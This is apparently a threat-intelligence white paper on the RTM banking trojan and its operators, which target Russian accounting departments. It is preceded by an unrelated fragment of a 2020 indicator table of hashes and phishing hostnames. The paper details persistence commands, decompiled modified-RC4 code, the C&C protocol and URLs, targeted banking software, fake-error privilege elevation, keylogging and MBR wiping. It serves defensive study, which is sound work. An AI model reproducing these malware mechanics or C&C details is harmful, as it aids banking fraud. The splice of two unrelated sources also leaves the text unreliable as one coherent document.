FileHash-SHA256
164c64634bf6fbf3f40711be46778be4ac45a7d83dd3f78b0a09464db7b329c7 Script PK September 2020
FileHash-SHA256
a952e5c8f2b169381dbe556373e250a4af208d4558d3be0c4ecebc9df4192459
DLL - Decrypted Final
payload PK September 2020
FileHash-SHA256
17b32c13caaae90e373305d5711a98ccd39ecbed0ad64efff20832c8772fb955 DLL PK September 2020
Hostname mail-apfgovnp[.]ddns[.]net Phishing Page NP Gov October 2020
Hostname mail-apfgavnp[.]hopto[.]org Phishing Page NP Gov October 2020
Hostname mail-nepalpolicegovnp[.]duckdns[.]org Phishing Page NP Gov October 2020
Hostname mail-ntcnetnp[.]serveftp[.]com Phishing Page NP Tech November 2020
Hostname mail-kmgcom[.]ddns[.]net Phishing Page NP Media November 2020
Hostname mail-mfagovcn[.]hopto[.]org Phishing Page CN Gov November 2020
Domain ms-trace[.]net CN Gov November 2020
FileHash-SHA256
34446f7f60f730fcca145155d10d1aff0a1153b085836df38313772cd03c8d70 RTF CVE-2017-11882 CN Gov November 2020
FileHash-SHA256
7238f4e5edbe0e5a2242d8780fb58c47e7d32bf2c4f860c88c511c30675d0857 RTF CVE-2017-11882 CN Gov November 2020
FileHash-SHA256
ab7c1967bf1fefdffde93626b78eb30994655ab02f59e0adb0935e3e599a953f RTF CVE-2017-11882 CN Gov November 2020
FileHash-SHA256
2548a819e4c597ba5958d2d18baa544452948e5b00271570192ccd79abe88e8d Script - (HTA) - "1.a" CN Gov November 2020
FileHash-SHA256
ed5e1d6e914de64a203f2f32ab95176fc7efff3a520915971d5fe748e79d611c Script - (HTA) - "1.a" CN Gov November 2020
FileHash-SHA256
96bf8f579acb8d9d0ff116d05fdadef85953f11e5b2e703041fdae0abf5b75dc Script - (HTA) - "1.a" CN Gov November 2020



Page 39
FileHash-SHA256
799260b992c77e2e14f2d586665c570142d8425864455cab5f2575015cd0b87a DLL CN Gov November 2020
Domain cdn-sop[.]net PK Gov November 2020
FileHash-SHA256
e3be9192477e43ad94b16f4c0a9775adf9019172c0c89712907a8f9a1680100c RTF CVE-2017-11882 PK Gov November 2020
Domain gov-pok[.]net PK Gov November 2020
FileHash-SHA256
280fb291d49f277067667838cdf30a940eaed9ed7712448158ea29e1ce6af86f RTF - "MoU's.doc" CVE-2017-11882 PK Gov November 2020
FileHash-SHA256
2ab12f79e435abe40ad30076eb4722be724d766c8050dcd9a90fa9f17e6eff1f NDC Participants.docx PK Gov November 2020
FileHash-SHA256
8d7ad2c603211a67bb7abf2a9fe65aefc993987dc804bf19bafbefaaca066eaa DLL PK Gov November 2020
Domain cdn-edu[.]net CN Gov November 2020
FileHash-SHA256
1cbec920afe2f978b8f84e0a4e6b757d400aeb96e8c0a221130060b196ece010
Docx - "NYBZKBREP_reg.form_1113.docx" CN Gov November 2020
FileHash-SHA256
a377e5f4bf461b86f938959256b7ab8b1b40bb9fd3cd45951c736a22366a8dd1 Android application Unknown Unknown
FileHash-SHA256
0c182b51ff1dffaa384651e478155632c6e65820322774e416be20e6d49bb8f9 Android application Unknown Unknown
FileHash-SHA256
061b0379a12b88488db8540226e400e3f65fef9a4c1aa7744da9f17e1d93d78d Android application Unknown Unknown
FileHash-SHA256
fb6ac9d93fd47db3d32f6da6320344a125e96754a94babb9d9d12b6604a42536 Metasploit Stager Unknown Unknown
FileHash-SHA256
468b74883536938ef3962655dfcc3ca4097ca9b5b687dfc1fef58d50e96dc248 Metasploit Stager Unknown Unknown

There are several groups actively and profitably targeting businesses in Russia. A trend that we have seen unfold before our eyes lately is these cybercriminals’ use of simple backdoors to gain a foothold in their targets’ networks. Once they have this access, a lot of the work is done manually, slowly getting to understand the network layout and deploying custom tools the criminals can use to steal funds from these entities. Some of the groups that best exemplify these trends are Buhtrap, Cobalt and Corkow. The group discussed in this white paper is part of this new trend. We call this new group RTM [1]; it uses custom malware, written in Delphi, that we cover in detail in later sections. The first trace of this tool in our telemetry data dates back to late 2015. The group also makes use of several different modules that they deploy where appropriate to their targets.

They are interested in users of remote banking systems (RBS), mainly in Russia and neighboring countries. In this paper, we cover the details of their tools, whom they target, and offer a rare glimpse into the type of operation they are carrying out. 1. Targets That this group is mostly targeting businesses is apparent from the processes they are looking for on a compromised system. They look for software that is usually only installed on accountants’ computers, such as remote banking software or tools to help with accounts payable. The full list of the processes they target is detailed in Section 4.4.2. While both RTM and Buhtrap [2] are looking for a quite similar process list, the infection vectors are quite different. While the latter mostly used spear phishing campaigns, this group uses typical crimeware distribution channels such as drive-by downloads and spam. From our telemetry data, we see this threat actor focusing mostly on Russia and neighboring countries, with a few hits elsewhere.

However, due to the mass spreading mechanism used, seeing detections outside the presumed primary region of interest is not surprising. Figure 1 RTM telemetry Russia Germany Kazakhstan Ukraine Czech Republic   The total number of detections we have for this threat is low and the complexity of the malware is high, indicating that this group is targeting specific, high-value targets in the Russian region. In fact, the latest campaigns we have seen using the RTM malware contained interesting decoy documents as depicted in Figure 2. Figure 2 Decoy document used in recent RTM campaigns We found several types of decoy documents used by this group, such as contracts, invoices or tax-related forms. The nature of these decoy documents combined with the type of software targeted by this group lead us to believe they are going after accounting departments in Russian firms. These targets were also attacked by the Buhtrap group in 2014-2015.

While researching this group, we were able to interact with a few command and control (C&C) servers. The full list of commands that can be received from a C&C server will be covered in the following sections, but for now we can say that the client sends keylogger logs directly to the C&C, which then may respond with additional commands. However, the days where you could just connect to the C&C and gather all the interesting interactions you wanted are mostly gone. To receive commands from the server, we had to provide realistic logs. We were rewarded for our efforts by seeing several relevant commands. The first one was a request for the bot to hand over a specific file: 1c_to_kl.txt. This file is an export from popular accounting software called “1C: Enterprise 8” which, conveniently enough, is present in the process list that the bot is actively seeking. This software can work in tandem with different Remote Banking Systems (RBS) by exporting transfer data to a text file.

This text file can then be imported into an RBS to automate the payment order as seen in Figure 3. Figure 3 “1C: Enterprise 8” software export window As the data in this file contain information about the transfer, it is possible for the fraudsters to modify the information in the file in order to steal money from the victim. Figure 4 1c_to_kl.txt example   About a month after these files were requested from the C&C server, we saw the apparition of a new module: 1c_2_kl.dll. This module was pushed as a plugin to compromised systems and has the capacity to parse the export file automatically by injecting itself in the accounting software process. This module will be detailed in a later section. Interestingly, FinCERT, a Russian CERT responsible for fighting cybercrime targeting Russian financial institutions, issued a statement warning potential victims against criminals going after 1c_to_kl.txt export files in late 2016.

Also, the developers of “1C:  Enterprise 8” are already aware of this scheme and issued a statement [3] acknowledging the problem and enumerating the possible protective measures the user can take to prevent this attack. We also saw additional modules being downloaded once the bots reported to the C&C, such as a VNC module. This VNC module has both a 32 and 64-bits variants and is similar to a VNC module already seen in used in Dridex campaigns. We hypothesize that once the bot installs this VNC module, the criminals will use it to connect to the computer remotely and look around to see what they could do to take full advantage of the system. Organized groups like these usually then try to move laterally in the network, recovering account passwords through tools such as mimikatz and using other offensive tactics to learn more about the network and make the malware’s presence as persistent as possible.

Infection vectors The following figure shows the different infection vectors’ first-seen date gathered throughout our tracking. Figure 5 Infection vectors timeline 2015 December 22 Word Macros 2016 March 9 Trojan Downloader 2016 March 23 Winrar Archive 2016 April 11 Godzilla Loader 2016 October 19 RIG Exploit Kit 2016 December 1 Double Extension - spam 2016 December 22 DropBox Link - spam 2016 July 25 Excel Macros 2016 April 19 RIG Exploit Kit 2016 July 5 Fake Update 2016 May 13 Downloader 2016 September 26 Buhtrap Downloader 2016 April 25 Sundown Exploit Kit    This group has used a large array of infection vectors, mostly revolving around drive-by downloads and spam. These channels are well suited for targeted attacks, since for the former, cybercriminals can pick websites likely to be visited by their targets, and for the latter, send emails with attachments directly to businesses or individuals the cybercriminals are attacking. The fact that their malware is distributed through several different channels – such as the RIG [4] and Sundown exploit kits or spam runs – also shows that this group has strong ties with criminals in the underground market who are selling these services.

2.1. Is the malware related to Buhtrap? As RTM exhibits some operational similarities to what we have seen with Buhtrap, one might legitimately wonder whether they are related. In September 2016, we saw an RTM sample being distributed by a Buhtrap downloader. We also saw two code-signing certificates used to sign samples of both Buhtrap and RTM. The first one, issued to a company allegedly called TOV DNISTER-M, was used to sign a Delphi second stage (SHA-1: 025C718BA31E43DB1B87DC13F94A61A9338C11CE) as well as a Buhtrap DLL (SHA-1: 1E2642B454A2C889B6D41116CCDBA83F6F2D4890). Figure 6 Code-signing certificate used by both RTM and Buhtrap The second one, issued to a company allegedly called Bit-Tredj, was used to sign Buhtrap downloaders (SHA-1: 7C1B6B1713BD923FC243DFEC80002FE9B93EB292 and B74F71560E48488D2153AE2FB51207A0AC206E2B) fetching and installing an RTM payload. Table 1 highlights key characteristics of these certificates. Although they shared the code-signing certificate with other malware families, they also used one that, according to our telemetry, was used only by them.

It was issued to a company allegedly called Kit-SD and was used to sign some RTM malware (e.g. SHA-1: 42A4B04446A20993DDAE98B2BE6D5A797376D4B6). Table 1 Code-signing certificates used by RTM Company Name Validity Period Thumbprint & Serial Bit-Tredj 29/05/2016 – 30/05/2017 Thumbprint 2c14b428c4f5e260db13cff1b6b28d22beb59d7f Serial 54460e1fcd612cd3377ac2cd76e4240f TOV DNISTER-M 19/04/2016 – 20/04/2017 Thumbprint 457880da8899679870ad5b87312d882c006c9559 Serial 2567a463a84bb9d4207a11ec979205ac Kit-SD, OOO 21/06/2016 – 22/06/2017 Thumbprint b79d75191b3c0e3742b42c82e0a40dff9976708a Serial 1e21a4adcda618adc7b53193ef4aaf62 Because they used the same Buhtrap downloader, they also shared some network indicators, since an RTM payload was downloaded from Buhtrap infrastructure. That said, as RTM has been using several different ways to distribute their malware besides the Buhtrap downloader, we believe that the groups using these two malware families are not the same. However, they are using a similar modus operandi. They are both targeting businesses using accounting software, are fingerprinting systems of interest similarly, are looking for smart card readers, and finally, they deploy an array of malicious tools to spy on their victims.

3. Evolution In this section, we will cover the different versions of the malware we have seen during our tracking, but first we need to define a way to follow its evolution. 3.1. Versioning RTM stores configuration data in registry keys and a particularly interesting piece of information is called botnet-prefix. A list of all the values we have seen in the samples we analyzed is presented in Table 2. Table 2 List of botnet prefixes 0.1.6.4 0.1.6.6 0.1.7.6 0.1.9.0 bit bit2 bit3 hit3 mtr KL2 kosmos main We are not sure of the purpose of this value. It may be used to record a version of the malware. However, we observed very few changes between consecutive versions such as bit2 and bit3 or 0.1.6.4 and 0.1.6.6. Moreover, one of the prefixes, main, has existed since the beginning and even evolved from typical C&C domains to .bit domains, as we will explain in Section 4.3.

3.2. Timeline Using telemetry data, we created a timeline of the first appearance of the samples we have seen. This is presented in Figure 7. Figure 7 Timeline of the RTM malware 4. Technical analysis In this section, we describe the main functions of the RTM banker. These include the persistence mechanism, their custom version of the RC4 algorithm, the network protocol, the spying abilities and some other miscellaneous functions. In particular, we will focus on the samples SHA-1 AA0FA4584768CE9E16D67D8C529233E99FF1BBF0 and 48BC113EC8BA20B8B80CD5D4DA92051A19D1032B. 2015 October First konwn appearance of the RTM malware. Main prefix. 2016 March Appearance of the KL2 prefix. 2016 April Switch to .bit C&C domains for all the prefixes. Appearance of the bit2 and bit3 prefixes. 2016 October First known appearance of the 0.1.6.6 prefix. 2016 July First known appearance of the hit3 prefix. Does not use .bit C&C domains. 2016 September First known appearance of the kosmos and 0.1.6.4 prefixes.

2016 December First known appearance of the 0.1.7.6 prefix. 2017 January First known appareance of the 0.1.9.0 prefix. 4.1. Installation and persistence 4.1.1. Executable The core of the RTM malware is a DLL but it is dropped onto the disk by a .EXE. That executable file is generally packed and contains the DLL code. When it is launched it only extracts the DLL and runs it using the following command: rundll32.exe “%PROGRAMDATA%\Winlogon\winlogon.lnk”,DllGetClassObject host 4.1.2. DLL The main DLL is always dropped on the disk as winlogon.lnk in the %PROGRAMDATA%\Winlogon folder. This file extension usually refers to a shortcut [5] but this file is actually a DLL written in Delphi, which was called core.dll by its developers as shown in Figure 8. Figure 8 DLL name for sample F4C746696B0F5BB565D445EC49DD912993DE6361 Just after being launched, the malware sets up its persistence mechanism. It can do this in two different ways, depending on the victim’s level of user privileges.

That is, if running as admin, it can add an entry in the HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ registry under the name “Windows Update”. The commands that are in the data of the “Windows Update” value will be executed at the start of the user session. It will also try to add a task in the Windows Task Scheduler. This task will launch the winlogon.lnk DLL with the same export and parameter as explained before. If running as an ordinary user, it will add a value in the HKCU\SOFTWARE\Microsoft\Windows\ CurrentVersion\Run\ registry under the same name, “Windows Update” and with the same data: 4.2. Modified RC4 algorithm Despite its known weaknesses, the RC4 algorithm is regularly used by malware authors. However, RTM’s programmers have decided to modify it slightly, possibly to slow down analysis by security researchers. This variant of RC4 is widely used in RTM in its malware to encrypt strings, network data, configuration and modules.

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows Update [REG_SZ] = rundll32.exe “%PROGRAMDATA%\winlogon.lnk”,DllGetClassObject host rundll32.exe “%PROGRAMDATA%\winlogon.lnk”,DllGetClassObject host   4.2.1. Differences The original RC4 algorithm is divided into two main parts: the Key-Scheduling Algorithm (KSA) and the Pseudo-Random Generation Algorithm (PRGA) [6]. The KSA part consists of the initialization of the s table using the key. In the PRGA part, the plain text is processed, using the s table, to obtain the ciphertext. In the RTM malware, the authors added an intermediate step between the initialization of the s table and the encryption of the plaintext, meaning that it comes between the KSA and the PRGA. Before encrypting data, the s table is XORed with a four-byte number. This additional key is variable and is given at the same time as the data to encrypt or decrypt. The function that performs this additional step is given in Figure 9. Figure 9 Additional step in the RC4 algorithm 4.2.2. String encryption At first glance, there are few strings readable in the main DLL.

The others are encrypted with the previous algorithm using the structure described in Figure 10. We found more than 25 different RC4 keys used for string encryption in the samples we analyzed while the XOR key is different for each string. The value of the integer field separating each string structure is always 0xFFFFFFFF. At the beginning of its execution, the malware decrypts the strings into a global variable. Then, when it needs to access a string, it dynamically computes the address of the decrypted strings based on a base address and an offset. unsigned int __fastcall TCrypt_RC4_variant_xor_stable(int a1, char *s_table, char *xored_s_table, int iv) { unsigned int i; // eax@1 unsigned int v5; // eax@2 i = 0; do { *&xored_s_table[i] = iv ^ *&s_table[i]; v5 = i + 4; *&xored_s_table[v5] = iv ^ *&s_table[v5]; v5 += 4; *&xored_s_table[v5] = iv ^ *&s_table[v5]; v5 += 4; *&xored_s_table[v5] = iv ^ *&s_table[v5]; v5 += 4; *&xored_s_table[v5] = iv ^ *&s_table[v5]; v5 += 4; *&xored_s_table[v5] = iv ^ *&s_table[v5]; v5 += 4; *&xored_s_table[v5] = iv ^ *&s_table[v5]; v5 += 4; *&xored_s_table[v5] = iv ^ *&s_table[v5]; i = v5 + 4; } while ( i < 255 ); return i; }  The strings contain interesting information about the functions of the malware.

Some examples of these strings are found in Section 6.8. Figure 10 Encrypted strings structure 4.3. Network The way the malware contacts the C&C has changed over the different versions. The first few samples, from October 2015 to April 2016, used traditional domain names along with an RSS feed hosted on livejournal.com to update the C&C list. Starting in April 2016, we observed in our telemetry data a move toward the use of .bit domains, which provides, as explained in Section 4.3.2, more resilience against domain takedown. The move is confirmed by the registration date of the C&C domains: the first RTM C&C .bit domain, fde05d0573da.bit, was registered on March 13th, 2016. All C&C URLs we saw during our tracking shared a common path: /r/z.php. As this path is uncommon, it helps to identify RTM requests in network flows. 4.3.1. C&C feed Older samples used a feed to update their list of C&C servers.

This is hosted on livejournal.com and at the time of writing it is still up at the URL hxxp://f72bba81c921(.)livejournal(.)com/ data/rss. Livejournal [7] is a US/Russian company providing social network services such as a blog-hosting platform. The RTM operators simply created a blog on livejournal and posted an article containing the feed of encrypted C&Cs. A screenshot of this blog is presented in Figure 11. Figure 11 C&C feed hosted on livejournal struct struct_encrypted_string { int separator; //constant - 0xFFFFFFFF  int size;  int xor_key[4];  char encrypted_data[size];  };   The C&C strings are encrypted with the RC4 algorithm variant presented in Section 4.2. The actual version (November 2016) of the feed contains the following C&C addresses: hxxp://cainmoon(.)net/r/z.php hxxp://rtm(.)dev/0-3/z.php hxxp://vpntap(.)top/r/z.php 4.3.2 .bit domains In the most recent versions of the RTM malware, the authors switched to C&C domains that use the .bit Top-Level Domain (TLD) [8]. This is not in the Internet Corporation for Assigned Names and Numbers (ICANN) list of TLDs [9].

Instead, it relies on the Namecoin cryptocurrency, a fork of the wellknown Bitcoin. Malware authors do not frequently use the .bit TLD for their C&C domains, though an example of such use was previously seen in a version of the Necurs botnet [10]. Unlike Bitcoin, Namecoin blockchain users are able to store data. One of the main uses for this feature is the top level domain .bit. It is possible to register domains that will be stored in the blockchain. The associated record in the blockchain also includes the IP addresses the domain is resolving to. Thus, this TLD is said to be “censorship-resistant” because only the registrant can change the resolution of a .bit domain. That means it is much more difficult to disrupt a malicious domain using this kind of TLD. However, the RTM malware does not embed any of the software needed to read the Namecoin blockchain.

It relies on DNS tier servers like dns.dot-bit.org or OpenNic servers to resolve the .bit domains. Hence, it has the same resilience as the DNS servers it uses. We observed that some C&C domains stopped being resolved after they were mentioned in a blogpost. Another advantage to the attackers of the .bit TLD is the cost. To register a domain, the operators only need to pay 0.01NC which corresponds to 0.00185 USD (as of December 5th, 2016). By comparison, a .com domain costs at least 10 USD. 4.3.3. Protocol To contact its C&C, the malware uses HTTP POST requests with data formatted using a custom protocol. The path is always /r/z.php and User-Agent set to Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0). In the requests to the C&C server, the data are formatted as follows, where the offset values are in bytes: 0 4 xor key xored botnet id 6 CRC32 10 PADDING 14 Bot id 26 Botnet prefix 34 38 39 #action Optional data Tickcount value Figure 12 C&C requests protocol The bytes 0 to 6 are not encrypted while the bytes starting at 6 are encrypted with the RC4 algorithm variant.

The packet structure of the C&C’s replies is simpler. The bytes from 4 to packet size are encrypted. Figure 13 C&C replies protocol A list of the possible values of the action byte is provided in Table 3. Table 3 Possible values of the action field Value Action 0 OK (ACK) 1 Core. Optional: a string that contains a command. 3 Unrecognized request type 4 Unexpected request type 5 Install module 6 Execute downloaded executable 7 Execute downloaded executable. If the process does not have administrative rights, it will try to elevate its privileges using the method presented in Section 4.8.2. 8 Load downloaded DLL 9 Load and execute an MZ executable in memory without using a file. 10 Add a certificate to the windows store 11 Self-Update 12 Write a file into the common app data folder. (Usually C:\ProgramData) The malware always computes the CRC32 of the decrypted data and compares it with the one provided in the packet.

If they differ, it will simply drop the packet. xor key CRC32 #action optional data 0 4 8 9    The optional data can contain different objects such as a PE file, a file to search in the file system or a new C&C URL. 4.3.4. Panel Interestingly, we note that a panel is available on the C&C servers used by RTM. A screenshot of the login page is shown in Figure 14. Figure 14 Login page for the RTM panel 4.4. Fingerprint The RTM malware is a banking Trojan so it is not surprising that its operators need information about the victim’s machine. The information gathered by the bot can be divided into two parts. On one hand, we find common information about the OS attributes. On the other hand, the malware checks whether the compromised machine contains artefacts related to Russian remote banking systems. 4.4.1. Common information After the malware is installed or launched after a reboot, a report containing common information is sent to the C&C server.

It contains: The time zone The default language identifier The privileges of the logged-in user The process integrity level The username The computer name The OS version The additional modules installed The security software installed The list of smart card readers    4.4.2. Remote banking system A typical target for banking Trojans is the remote banking system [11] [2]. RTM is not an exception, as one of its classes is called TBdo. Bdo is the Russian translation for RBS (Remote Banking System) so it is clear that RBS is a target for this malware. This class is able to perform several tasks including the scanning of drives and of browsing history. When the malware scans the drive, its sole aim is to determine whether banking software is installed on the machine. A full list of targeted software is available in Table 4. If it finds an interesting file, it reports the information to the C&C server.

The next actions performed by the malware depend on the logic, which is on the C&C server-side. Table 4 Targeted software _ftcgpk.exe 1cv8s.exe CLBANK.EXE iscc.exe sbis.dll wclnt.exe 1cv7.exe bicrypt client.jks ISClient.exe sbis.exe webmoney.exe 1cv7l.exe bssax.ocx faktura maratl.exe SGBClient.exe winpost.exe 1cv7s.exe cbmain.ex ifobsclient.exe npbssplugin.dll SGBClient.exe 1cv8.exe cbsmain.dll internetbanktools.exe qiwicashier.exe transaq.exe 1cv8c.exe cft - bank client intpro.exe rclient.exe wallet.dat The RTM malware also looks for banking URL patterns in IE’s browsing history and in the opened tabs. For the history, it browses using the functions FindNextUrlCacheEntryA and FindFirstUrlCacheEntryA and for each entry, it checks to see if the URL matches one of the patterns shown in Table 5. For opened tabs, it connects to Internet Explorer and Firefox through the Dynamic Data Exchange (DDE) [12] mechanism to access the current URL of tabs opened. For each tab, it also checks if that matches a pattern shown in Table 5. The browsing history and the opened tabs check is executed in a WHILE loop with a sleep of 1 second between the checks.

The other data monitored in real time will be detailed in Section 4.5. Table 5 Targeted URLs bsi.dll? faktura.ru elba.raiffeisen online.payment.ru /iclient/ handybank. bankline.ru ibank2 wupos.westernunion /ic/login.zhtml bco.vtb24.ru online.sberbank /servlets/ibc elbrus.raiffeisen If a pattern is found, it is reported to the C&C using the list of strings presented in Table 6. Table 6 Identifier for a banking related machine BSS RosBank BiCrypt SberBank_Fiz ISCC BSS_PC SberBank_BO VTB24 CFT WebMoney iBank2_PC INIST SGB WinPost XTC Faktura Inversion Raiffeisen SBIS iFOBS PCB Interbank HandyBank ClBank TRANSAQ InterPro iBank2 WU QiwiCashier OSMP 4.5 Monitoring When the malware starts, various fingerprint information is sent to the C&C server, including the presence of banking software. This fingerprinting occurs only when the malware first starts monitoring the system, just after the initial scan is finished. 4.5.1. Remote banking system The previously discussed class TBdo is also responsible for monitoring banking-related events. As in the initial scan, it uses DDE to check tabs in Firefox and Internet Explorer; another class, TShell, is also used to monitor shell windows (Internet Explorer and Explorer windows).

This class uses the COM interfaces IShellWindows, iWebBrowser, DWebBrowserEvents2 and IConnectionPointContainer to monitor the windows. When the user navigates to a new webpage, the malware is notified. It then checks the URL against the patterns provided in Table 5. If a match is found, it will take six consecutive screenshots, waiting 5 seconds between each one. Finally, it sends the screenshots to the C&C server. It also checks for some window titles, related to banking software. A full list of these titles is available in Table 7. Table 7 Banking windows targeted Window name Class name ClBank SunAwtFrame ClBank SunAwtDialog Логин (Login) TLoginWindow Null TfmISClient Ключ электронной подписи (Key Electronic Signature) TInitialForm    4.5.2. Smart card The RTM malware has the ability to monitor smart card readers connected to the infected computers. These devices are used in some countries to validate banking related orders. So, if this kind of device is attached to the computer, it may indicate that these machines are used to perform banking transactions.

However, unlike other banking Trojans [13], it is not able to interact with these smartcards. Such features may be included in an additional module we have not yet seen. 4.5.3. Keylogger An important part of the monitoring of the victim’s computer is to record the keystrokes. Moreover, it seems that the RTM developers did not want to miss any information, as they monitor not only the keyboard but also the virtual keyboard and the clipboard. To do so, they use the SetWindowsHookExA function to hook the keyboard and the mouse. When an event occurs, they log the key pressed, or the key corresponding to the click on the virtual keyboard, along with the software name and the date. Then, the buffer is sent to the C&C. For the clipboard, they use the SetClipboardViewer function. They only log the clipboard content when the data is text. As for the keyboard, they also log the software name and the date before sending the buffer to the C&C.

4.5.4. Screenshots The last monitoring feature is the ability to make screenshots. This is used when the shell monitoring class detects an interesting website or when a banking software window is detected. The screenshot is taken using the GDI library before being sent to the C&C. 4.6. Uninstall The C&C can send a command to stop all the malware activities and clean the computer. It will clean all the files and the registry entries created during the execution of RTM on the victim’s machine. Then, using an additional DLL encrypted in the malware, it will kill the malware and delete the winlogon file. Finally, it shuts down the computer. As shown in Figure 15, this DLL was called erase.dll by its developers. Figure 15 Cleaning DLL name A more destructive command can be sent to the malware, called uninstall-lock. If the malware has administrative rights it will try to erase the MBR.

If it fails, it tries to move the MBR to a random path. If it succeeds, the computer will no longer boot after the shutdown. In this event, it would probably lead to a full reinstallation of the machine, erasing all possible forensic evidence. If the program has low privileges, the malware writes a .EXE that is encrypted in the main RTM DLL. This .EXE is really small and only implements the code needed to shut down the computer. It will also register this executable in the HKCU\CurrentVersion\Run registry key. Thus, each time the user starts a session, the computer will immediately shut down. 4.7. Config By default, the RTM malware doesn’t really have a config file. However, the C&C can push config values that will be stored in the registry and used by the malware. A list of configuration keys is presented in Table 8. Table 8 Configuration keys keylogger.last-data botnet-id cc.url.1 keylogger.last-wnd-caption cc.connect-interval cc.url.2 keylogger.last-exe-path scan-files scards.monitoring-interval botnet-prefix post-install-report dbo.detected scan-files multiinstance-off post-install-report-url modules-data.%modulename% keylogger-off dbo-detector-off scard-off modules-off modules.%modulename% The configuration is stored in the registry Software\[Pseudo-random string] key.

In this registry key, each value corresponds to one of the strings presented in the previous table. However, the values and the associated data are encrypted using RTM’s custom RC4 algorithm. The data has the same structure as the network or the strings. The four-byte XOR key is added at the beginning of the encrypted data. For the configuration values, the XOR key is different and depends on the size of the value. It can be computed as follows: Figure 16 Configuration values xor key 4.8. Other functions This malware has many other functions that we present here. 4.8.1. Additional modules It can run additional modules that are DLL files. They are sent over the network by the C&C server and could be run as external programs. They can also be mapped in memory and launched in new threads. For storage, they are saved in .dtt files and encrypted using the custom RC4 algorithm with the same key used for the network communications.

At this time, we have seen only the VNC module (8966319882494077C21F66A8354E2CBCA0370464), the browser data exfiltration module (03DE8622BE6B2F75A364A275995C3411626C4D9F) and the 1c_2_kl module (B1EE562E1F69EFC6FBA58B88753BE7D0B3E4CFAB) being installed on an infected machine. xor_key = (len(config_value) << 24) | (len(config_value) << 16) | len(config_ value)| (len(config_value) << 8)    For the VNC module, the C&C server later sent a command, asking to connect to a VNC server at a specific IP address on port 44443. The browser data exfiltration plugin implements the class TBrowserDataCollector, which is able to read the IE’s browsing history. It then sends the full list of visited URLs to the C&C server. The last discovered module is called 1c_2_kl and is able to interact with the 1C software suite, which was described in Section 1. This module is divided in two parts: a main DLL and two agents (32 and 64 bits) that will be injected in every process by registering a hook to the WH_CBT event.

If the agent is injected in a process of the 1C suite, it hooks the CreateFile and WriteFile functions. Whenever the hooked CreateFile function is called, it keeps in memory the file path should its filename be 1c_to_kl.txt. Then, when a call to WriteFile is intercepted, it calls the genuine WriteFile function and sends the 1c_to_kl.txt file’s path to the main module DLL by sending it a crafted WM_COPYDATA Windows message. Finally, the main module DLL opens and parses the file to identify payment orders. It extracts both the total amount and number of transactions contained in the file. Ultimately, it sends this information to the C&C server. At this time, we believe this module is still in development as it contains debug messages and it cannot modify automatically the 1c_to_kl.txt file. 4.8.2. Privilege elevation This malware can try to elevate its privileges by showing fake error messages. First, it mimics a registry check by using a similar design to typical Windows progress bars, as shown in Figure 17.

It also uses the real regedit icon. We could also note the spelling mistake in “whait”. After a few seconds, the scan is finished and a fake error message is displayed. Figure 17 Bogus registry check dialog This fake error message, shown in Figure 18, would easily fool a typical end user. Once again, the design is similar to that of a regular Windows error message, but again there are telltale grammatical errors not found in real Windows error dialogs. If the user clicks on one of the two choices, it will try to elevate the malware’s privileges. Immediately after the user clicks on one of the restore choices, the malware launches the DLL using the runas option in the ShellExecute function. This will run the program with administrative privileges. However, the user will be prompted with a real UAC prompt coming from the Windows system, shown in Figure 19, asking the user to allow the privilege elevation.

If thus allowed, the malware will run with administrative privileges. Thus, rather than depending on a vulnerability, it tries to confuse the user. Moreover, depending on the machine’s default language, error messages will be displayed in English or in Russian. Figure 18 Fake registry error Figure 19 Actual UAC prompt from Windows 4.8.3. Certificates The malware can also add certificates to the Windows store and it is able to validate the addition by automatically clicking “Yes” on the csrss.exe dialog box. This behavior is not new, as the Retefe banking Trojan is also able to self-validate a new certificate installation [14]. 4.8.4. Backconnect The malware authors also implemented a Backconnect TCP tunnel. We have not seen any usage of this functionality but it may be used to control the infected machines remotely. 4.8.5. Host file management The C&C can send a command to the malware to modify Windows’ etc/hosts file.

The hosts file is used on Windows systems to make custom DNS resolutions. 4.8.6. Find and send a file The C&C can ask the malware to find a file on the file system and to upload it to the server. For instance, during our investigation, we received a command from the C&C server asking for the file 1c_to_kl.txt. As explained before, this file can be generated by the accounting software 1C:  Enterprise 8. 4.8.7. Update Finally, the authors can update the malware by sending a new DLL that will replace the current version. 5. Conclusion Our research on the RTM malware shows that the Russian banking system is still a target of choice for criminals. Other groups, such as Buhtrap, Corkow and Carbanak, were already known to target and successfully steal money from financial institutions and their customers in Russia. Thus, RTM is another player in this profitable game. According to our telemetry, this piece of malware has been used since the end of 2015 or earlier.

Even though it does not use previously unknown techniques, it implements a full range of spying capabilities including smart card reading, keylogging and real-time monitoring of banking-related activities. It can also search for export files created by accounting software such as 1C: Enterprise 8. Finally, its command and control infrastructure is highly resilient, since it uses the decentralized and non-censurable .bit top-level domain. The Indicators of Compromise (IOCs) are detailed in Section 6 and on GitHub. If you have any questions related to this investigation, please contact us at threatintel@eset.com. Acknowledgements Special thanks to our colleagues Anton Cherepanov and Jan Matušík for their help in this research. 6. Indicators of Compromise 6.1. ESET detection names Win32/Spy.RTM.A Win32/Spy.RTM.B Win32/Spy.RTM.C Win32/Spy.RTM.D Win32/Spy.RTM.E Win32/Spy.RTM.F Win32/Spy.RTM.G Win32/Spy.RTM.H Win32/Hvnc.AD Win64/Spy.RTM.A 6.2. File names C:\ProgramData\Winlogon\winlogon.lnk 6.3. Registry indicators HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run : Windows Update = rundll32.exe “%PROGRAMDATA%\Winlogon\winlogon.lnk”,DllGetClassObject host HKLU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run : Windows Update = rundll32.exe “%PROGRAMDATA%\Winlogon\winlogon.lnk”,DllGetClassObject host 6.4. Hashes 6.4.1.

